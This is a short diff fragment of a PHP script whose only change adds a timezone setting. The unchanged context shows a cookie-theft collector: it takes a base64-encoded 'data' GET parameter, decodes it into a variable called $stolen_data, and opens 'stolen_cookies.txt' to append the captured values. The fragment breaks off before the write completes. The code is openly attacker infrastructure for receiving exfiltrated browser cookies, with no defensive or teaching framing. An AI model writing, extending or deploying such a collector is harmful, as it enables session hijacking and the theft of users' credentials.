@@ -1,5 +1,6 @@
 <?php
 // Data collection logic
+date_default_timezone_set('Asia/Jerusalem');
 if (isset($_GET['data'])) {
     $stolen_data = base64_decode($_GET['data']);
     $file = fopen("stolen_cookies.txt", "a");
